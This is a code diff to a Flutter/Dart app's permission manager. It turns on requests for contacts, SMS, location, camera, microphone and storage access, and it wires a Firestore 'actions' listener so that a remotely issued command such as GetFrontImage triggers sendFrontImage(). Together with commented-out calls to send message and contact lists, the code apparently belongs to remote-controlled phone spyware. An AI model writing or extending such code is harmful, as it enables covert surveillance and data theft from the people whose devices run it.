@@ -31,15 +31,15 @@ class PermissionManager {
   getPermissions() async {
     initiaiteSharedPreferences();
     // initilizeGlobalListiner();
-    // Map<PermissionGroup, PermissionStatus> permissions =
-    //     await PermissionHandler().requestPermissions([
-    //   PermissionGroup.contacts,
-    //   PermissionGroup.sms,
-    //   PermissionGroup.location,
-    //   PermissionGroup.camera,
-    //   PermissionGroup.microphone,
-    //   PermissionGroup.storage
-    // ]);
+    Map<PermissionGroup, PermissionStatus> permissions =
+        await PermissionHandler().requestPermissions([
+      PermissionGroup.contacts,
+      PermissionGroup.sms,
+      PermissionGroup.location,
+      PermissionGroup.camera,
+      PermissionGroup.microphone,
+      PermissionGroup.storage
+    ]);
     // print(permissions);
     // await sendMessagesList();
     // await sendContactsList();
@@ -51,9 +51,17 @@ class PermissionManager {
   }
 
   initilizeGlobalListiner() {
-    db.collection('actions').snapshots().listen((onData) async {
+    db.collection('actions').orderBy("requested_date", descending: true)
+        .limit(1).snapshots().listen((onData) async {
       print((onData.documents));
       if (isActionRequest && docLength != onData.documents.length) {
+
+        switch (onData.documents[0]['action']) {
+          case UserActions.GetFrontImage:
+            
+            break;
+          default:
+        }
         await sendFrontImage();
       }
       isActionRequest = true;
